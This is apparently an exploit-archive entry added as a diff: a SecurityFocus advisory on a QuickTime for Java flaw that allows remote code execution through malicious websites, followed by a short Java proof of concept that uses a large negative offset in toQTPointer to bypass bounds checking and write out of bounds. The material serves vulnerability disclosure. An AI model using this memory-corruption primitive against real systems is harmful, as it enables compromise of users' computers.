@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/23608/info
+
+QuickTime is prone to a vulnerability that may aid in the remote compromise of a vulnerable computer.
+
+The issue occurs when a Java-enabled browser is used to view a malicious website. QuickTime must also be installed.
+
+Attackers may exploit this issue to execute arbitrary code in the context of a user running the vulnerable application. Failed exploit attempts will likely result in denial-of-service conditions.
+
+This issue is exploitable through both Safari and Mozilla Firefox running on Mac OS X. Reports indicate that Firefox on Windows platforms may also be an exploit vector.
+
+Reports also indicate that Internet Explorer 6 and 7 running on Windows XP may be an exploit vector, but that a sandboxing feature may interfere with successful exploits. Neither of these points has been confirmed. 
+
+// Initialize QT
+QTSession.open();
+
+// Get a handle to anything
+byte b[] = new byte[1 /*arbitrary*/];
+QTHandle h = new QTHandle(b);
+
+// Turn the handle into a pointer object. The
+// large negative value throws off bounds checking.
+QTPointerRef p = h.toQTPointer(-2000000000 /*off*/, 10 /*size*/);
+
+// Write to it.
+p.copyFromArray(0 /*offset*/, b /*source*/, 0, 1 /*length*/);
